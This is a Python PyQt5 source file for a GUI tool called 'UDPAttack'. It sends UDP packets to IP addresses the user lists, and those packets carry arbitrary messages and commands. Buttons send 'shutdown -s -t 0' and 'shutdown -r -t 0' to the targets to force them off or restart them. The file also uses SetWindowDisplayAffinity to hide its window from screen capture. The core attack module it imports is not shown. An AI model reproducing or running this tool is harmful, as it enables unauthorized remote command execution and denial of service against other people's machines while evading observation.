from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from ctypes import *
from . import attackCore,Ui_udpattack
import sys
import datetime
class UDPAttack(QWidget,Ui_udpattack.Ui_UDPAttacker):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.retranslateUi(self)
        self.setup()
        windll.user32.SetWindowDisplayAffinity(int(self.winId()),0x11)
    def showE(self):
        windll.user32.SetWindowDisplayAffinity(int(self.winId()),0)
        windll.user32.SetWindowDisplayAffinity(int(self.winId()),0x11)
        self.show()
    def sendMessage(self):
        if self.textEdit.toPlainText():
            try:
                for ip in self.textEdit.toPlainText().split(";"):
                    if not ip: continue
                    sendList=[]
                    if self.plainTextEdit.toPlainText():
                        sendList.append(attackCore.pkg_sendlist("-msg",self.plainTextEdit.toPlainText()+" "*10))
                    if self.textEdit_2.toPlainText():
                        sendList.append(attackCore.pkg_sendlist("-c",self.textEdit_2.toPlainText()+" "*10))
                    attackCore.send(sendList,ip)
            except: pass
        else: attackCore.log+="[%s]请输入ip\n"%datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.textBrowser.setPlainText(attackCore.log)
    def shutdown(self):
        if self.textEdit.toPlainText():
            try:
                for ip in self.textEdit.toPlainText().split(";"):
                    if not ip: continue
                    attackCore.send([attackCore.pkg_sendlist("-c","shutdown -s -t 0"+" "*10)],ip)
            except: pass
        else: attackCore.log+="[%s]请输入ip\n"%datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.textBrowser.setPlainText(attackCore.log)
    def reboot(self):
        if self.textEdit.toPlainText():
            try:
                for ip in self.textEdit.toPlainText().split(";"):
                    if not ip: continue
                    attackCore.send([attackCore.pkg_sendlist("-c","shutdown -r -t 0"+" "*10)],ip)
            except: pass
        else: attackCore.log+="[%s]请输入ip\n"%datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.textBrowser.setPlainText(attackCore.log)
    def setup(self):
        self.setFixedSize(self.width(),self.height())
        self.setMaximumSize(self.width(),self.height())
        self.pushButton.clicked.connect(self.sendMessage)
        self.pushButton_2.clicked.connect(self.shutdown)
        self.pushButton_3.clicked.connect(self.reboot)
if __name__=="__main__":
    app=QApplication(sys.argv)
    window=UDPAttack()
    window.show()
    sys.exit(app.exec_())